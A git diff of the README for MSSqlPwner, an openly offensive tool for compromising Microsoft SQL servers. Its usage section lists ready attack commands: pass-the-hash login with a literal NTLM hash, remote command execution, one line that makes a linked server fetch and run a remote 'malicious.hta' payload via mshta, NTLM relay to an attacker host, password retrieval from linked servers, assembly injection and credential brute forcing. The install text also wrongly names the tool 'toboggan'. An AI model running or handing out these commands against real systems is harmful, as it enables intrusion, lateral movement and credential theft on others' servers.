@@ -1,7 +1,9 @@
 # MSSqlPwner
+
 <p align="center">
- <img src="https://github.com/ScorpionesLabs/MSSqlPwner/blob/main/logo.PNG?raw=true">
+ <img src="https://github.com/ScorpionesLabs/MSSqlPwner/blob/main/assets/logo.PNG?raw=true">
 </p>
+
 MSSqlPwner is an advanced and versatile pentesting tool designed to seamlessly interact and pwn MSSQL servers.
 That tool is based on impacket, which allows attackers to authenticate to databases using clear-text passwords NTLM Hashes,  and kerberos tickets.
 With MSSqlPwner, users can execute custom commands through various methods, including custom assembly, `xp_cmdshell`, and `sp_oacreate(Ole Automation Procedures)` and much more. 
@@ -15,16 +17,33 @@ This tool can be used for lateral movement assessments and exploration of linked
 If the authenticated MSSQL user does not have permission to execute certain operations, the tool can find the right chain that will allows command execution. 
 For example, if your user cant execute commands in the current context, the tool will build a chain that will use a link server and connect back to our server with escelated privileges.
 
-## Example
+
+## Installation
+Getting started with toboggan is as smooth. You can do this by pulling directly from the repository:
+```shell
+pip install 'mssqlpwner@git+https://github.com/ScorpionesLabs/MSSqlPwner.git'
+``` 
+
+Or, by using [`pipx`](https://pypa.github.io/pipx/) - and you should -, give this a whirl:
+```shell
+pipx install 'git+https://github.com/ScorpionesLabs/MSSqlPwner.git'
+```
+
+And you can now use your new favorite tool:
+```shell
+mssqlpwner -hashes ':0CB6948805F797BF2A82807973B89537' 'Administrator'@172.16.2.12 -windows-auth interactive
+```
+
+## Examples
 
 ### Command execution
 <p align="center">
- <img src="https://github.com/ScorpionesLabs/MSSqlPwner/blob/main/poc.png?raw=true">
+ <img src="https://github.com/ScorpionesLabs/MSSqlPwner/blob/main/assets/poc.png?raw=true">
 </p>
 
 ### Bruteforce
 <p align="center">
- <img src="https://github.com/ScorpionesLabs/MSSqlPwner/blob/main/brute.png?raw=true">
+ <img src="https://github.com/ScorpionesLabs/MSSqlPwner/blob/main/assets/brute.png?raw=true">
 </p>
 
 This tool is supported by multiple authentication methods and described below.
@@ -148,69 +167,61 @@ The tool adapts to various scenarios and environments, verifying the effectivene
 Take your MSSQL environment assessments to the next level with the power and versatility of MSSqlPwner. 
 Discover new possibilities for lateral movement, stealthy querying, and precise security evaluations with this the MSSqlPwner tool.
 
-## Installation
-```
-git clone https://github.com/ScorpionesLabs/MSSqlPwner
-cd MSSqlPwner
-pip3 install -r requirements.txt
-python3 MSSqlPwner.py
-```
-
 
 ## Usage
-```
 
+```shell
 # Interactive mode
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth interactive
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
 
 # Interactive mode with 2 depth level of impersonations
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth  -max-impersonation-depth 2 interactive
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth  -max-impersonation-depth 2 interactive
 
 
 # Executing custom assembly on the current server with windows authentication and executing hostname command 
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname
 
 # Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname
 
 # Executing the hostname command using stored procedures on the linked SRV01 server
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname
 
 # Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate
 
 # Issuing NTLM relay attack on the SRV01 server
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250
 
 # Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250
 
 # Issuing NTLM relay attack on the local server with custom command
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
 
 # Executing direct query
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth direct-query "SELECT CURRENT_USER"
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth direct-query "SELECT CURRENT_USER"
 
 # Retrieving password from the linked server DC01
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrive-password
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrive-password
 
 # Execute code using custom assembly on the linked server DC01
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 inject-custom-asm SqlInject.dll
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 inject-custom-asm SqlInject.dll
 
 # Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
-python3 MSSqlPwner.py hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt
+mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt
 
 # Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
-python3 MSSqlPwner.py hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt
+mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt
 
 # Bruteforce using tickets against the hosts listed on the hosts.txt
-python3 MSSqlPwner.py hosts.txt brute -tl tickets.txt -ul users.txt
+mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt
 
 # Bruteforce using passwords against the hosts listed on the hosts.txt
-python3 MSSqlPwner.py hosts.txt brute -ul users.txt -pl passwords.txt
+mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
 
 # Bruteforce using hashes against the hosts listed on the hosts.txt
-python3 MSSqlPwner.py hosts.txt brute -ul users.txt -hl hashes.txt
+mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
 
 ```
 
